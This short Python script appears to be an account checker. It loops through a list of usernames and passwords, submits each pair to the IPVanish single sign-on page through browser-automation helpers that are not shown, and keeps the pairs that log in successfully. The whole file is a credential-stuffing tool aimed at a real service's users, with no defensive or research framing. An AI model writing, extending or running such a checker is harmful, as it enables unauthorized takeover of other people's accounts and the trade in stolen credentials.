import time
from header import title
from browser_init import BrowserInit

if __name__ == '__main__':
    title()
    directory = "/home/roberto/Desktop/cookie.json"
    page = "https://sso.ipvanish.com/"

    counter = 0
    while True:
        browser = BrowserInit(page)
        user, password = browser.get_and_split_list()
        if counter == len(user):
            break
        browser.open_page_and_enter_credentials(user[counter], password[counter])
        time.sleep(8)
        browser.check_validity_and_store_if_valid(user[counter], password[counter])
        counter += 1
